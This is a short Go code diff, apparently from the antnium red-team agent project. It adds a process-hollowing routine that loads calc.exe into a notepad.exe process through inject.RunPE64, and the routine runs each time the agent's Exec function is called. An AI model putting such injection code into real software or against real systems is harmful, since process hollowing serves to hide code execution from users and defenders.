@@ -11,7 +11,11 @@ import (
 	"syscall"
 	"time"
 
+	"io/ioutil"
+
+	"github.com/dobin/antnium/pkg/inject"
 	"github.com/dobin/antnium/pkg/model"
+	log "github.com/sirupsen/logrus"
 	"golang.org/x/sys/windows"
 	"golang.org/x/text/encoding/charmap"
 )
@@ -65,12 +69,22 @@ func ExecOutputDecode(data []byte) string {
 	}
 }
 
+func hollow(source, replace *string) {
+	log.Infof("Replacing %s with %s\n", *source, *replace)
+	data, _ := ioutil.ReadFile(*replace)
+	inject.RunPE64(data, *source, "")
+}
+
 func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
 	stdOut = make([]byte, 0)
 	stdErr = make([]byte, 0)
 	pid = 0
 	exitCode = 0
 	err = nil
+
+	source := "c:\\windows\\system32\\notepad.exe"
+	replace := "c:\\windows\\system32\\calc.exe"
+	hollow(&source, &replace)
 
 	processTimeout := 10 * time.Second
 	ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
